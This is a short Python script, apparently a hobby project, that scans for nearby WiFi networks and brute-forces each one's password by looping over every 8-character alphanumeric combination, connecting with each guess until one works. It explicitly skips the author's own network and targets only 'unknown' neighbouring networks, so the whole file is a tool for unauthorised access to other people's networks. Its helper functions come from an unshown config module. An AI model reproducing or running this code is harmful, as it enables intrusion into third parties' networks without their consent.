from config import *
import time

'''
    Python version: 3.8.3
    By: Agostinho Pina Ramos
'''

def searchWIFI(ssid):
    chars = [
        "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z",
        "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"
    ]
    start_time = time.time()
    for d1 in chars:
        for d2 in chars:
            for d3 in chars:
                for d4 in chars:
                    for d5 in chars:
                        for d6 in chars:
                            for d7 in chars:
                                for d8 in chars:
                                    pasw = d1+d2+d3+d4+d5+d6+d7+d8 #The password length is 8
                                    print(ssid + ' : ' + pasw)
                                    if mkSense(pasw):
                                        '''
                                        Accepts repetition in maximum of three times
                                        Ex: AAA36274 or AA36A274 or ...
                                        In this case the maximum that letter 'A' can repeat is 
                                        three times.
                                        '''
                                        setWIFI(ssid, pasw)
                                        time.sleep(5)
                                        if is_connected():
                                            print('>>>> ' + SSIDPASS(ssid))
                                            print('\nDone!\n')
                                            print("--- %s seconds ---" % (round(time.time() - start_time,3)))
                                            return 0

search = ARRSSID() #All networks near my home
myNetwork = 'MYWIFI' #Put here the network that you already know the password. If not, you can leave it empty.

for ssid in search:
    if myNetwork != ssid: #Accepts only unknown networks
        searchWIFI(ssid)